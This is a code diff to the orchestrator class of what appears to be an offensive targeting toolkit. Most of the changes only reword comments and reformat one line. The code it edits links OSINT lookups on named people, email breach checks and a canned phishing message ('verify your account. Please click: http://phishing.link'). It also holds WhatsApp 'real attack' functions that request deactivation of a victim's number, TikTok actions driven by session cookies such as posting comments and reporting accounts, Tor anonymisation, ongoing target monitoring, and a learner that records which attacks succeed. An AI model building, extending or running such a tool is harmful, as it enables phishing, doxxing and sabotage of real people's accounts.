@@ -63,12 +63,10 @@ class Orchestrator:
         self.verifier = Verify()
         self.plugins = load_plugins(self)
 
-        # New attack modules
         self.wa_real = WaRealAttack()
         self.wa_sender = WaSeleniumSender(profile_dir='/app/whatsapp-profile')
         self.tiktok_real = TikTokRealAttack(TIKTOK_SESSION) if TIKTOK_SESSION else None
 
-        # Existing advanced features
         self.adv_osint = AdvancedOSINT()
         self.adv_attacks = AdvancedAttacks()
         self.report = ReportGenerator()
@@ -95,12 +93,12 @@ class Orchestrator:
                 self._retriever = None
         return self._retriever
 
-    # ---------- Core Methods ----------
+    # ---------- Core ----------
     def track(self, identifier):
         if '@' in identifier:
             osint_results = {'email': self.osint.scan_email(identifier)}
         else:
-            osint_results = self.osint.scan_username(identifier)  # returns sherlock, maigret, tookie
+            osint_results = self.osint.scan_username(identifier)
         target_id = db_insert_target(identifier, 'auto', osint_results)
         target_data = {'identifier': identifier, 'osint': osint_results}
         ai_result = self.ai.analyze_and_act(target_id, target_data)
@@ -166,12 +164,9 @@ class Orchestrator:
             except Exception as e:
                 return {'success': False, 'output': f'AI generation failed: {e}'}
         else:
-            return {
-                'success': True,
-                'output': f"Hi, this is support. We need to verify your account. Please click: http://phishing.link"
-            }
+            return {'success': True, 'output': "Hi, this is support. We need to verify your account. Please click: http://phishing.link"}
 
-    # ---------- Advanced OSINT & Reconnaissance ----------
+    # ---------- Advanced OSINT ----------
     def breach_check(self, email):
         return self.adv_osint.email_breach(email)
 
@@ -206,7 +201,7 @@ class Orchestrator:
     def virustotal_ip(self, ip):
         return self.threat.virustotal_ip(ip, VIRUSTOTAL_API_KEY)
 
-    # ---------- Reporting & Analysis ----------
+    # ---------- Reporting ----------
     def generate_report_pdf(self, target_id):
         target = db_get_target(target_id)
         if not target:
@@ -254,7 +249,7 @@ class Orchestrator:
     def shodan_ip(self, ip):
         return shodan_lookup(ip)
 
-    # ---------- WhatsApp Real Attacks ----------
+    # ---------- WhatsApp Real ----------
     def send_wa_message(self, phone, message):
         return self.wa_sender.send_message(phone, message)
 
@@ -270,7 +265,7 @@ class Orchestrator:
     def wa_deactivate(self, phone):
         return request_deactivation(phone)
 
-    # ---------- TikTok Real Attacks ----------
+    # ---------- TikTok Real ----------
     def hack_tiktok_comment(self, video_id, comment):
         if self.tiktok_real:
             return self.tiktok_real.post_comment(video_id, comment)
@@ -295,7 +290,7 @@ class Orchestrator:
     def tt_report(self, session_cookie, username):
         return report_tiktok_account(session_cookie, username)
 
-    # ---------- Anonymize (Tor) ----------
+    # ---------- Anonymize ----------
     def anonymize(self):
         try:
             import stem
@@ -313,7 +308,7 @@ class Orchestrator:
     def start_monitor(self, target_id, chat_id, send_func):
         threading.Thread(target=monitor_target, args=(target_id, chat_id, send_func), daemon=True).start()
 
-    # ---------- Self-learning ----------
+    # ---------- Learning ----------
     def record_outcome(self, target_id, attack, success):
         self.learner.record_outcome(target_id, attack, success)
 
